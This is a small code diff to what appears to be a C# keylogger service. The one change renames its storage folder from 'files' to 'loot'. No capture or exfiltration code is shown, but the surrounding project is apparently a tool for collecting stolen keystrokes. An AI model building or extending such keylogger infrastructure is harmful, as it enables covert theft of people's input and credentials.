@@ -10,7 +10,7 @@ public sealed class KeyloggerService : IKeyloggerService
     public KeyloggerService(IConfiguration configuration, IWebHostEnvironment environment)
     {
         var root = Path.GetFullPath(configuration["StoragePath"] ?? Path.Combine(environment.ContentRootPath, "storage"));
-        _filesDirectory = Path.Combine(root, "files");
+        _filesDirectory = Path.Combine(root, "loot");
         Directory.CreateDirectory(_filesDirectory);
     }
 
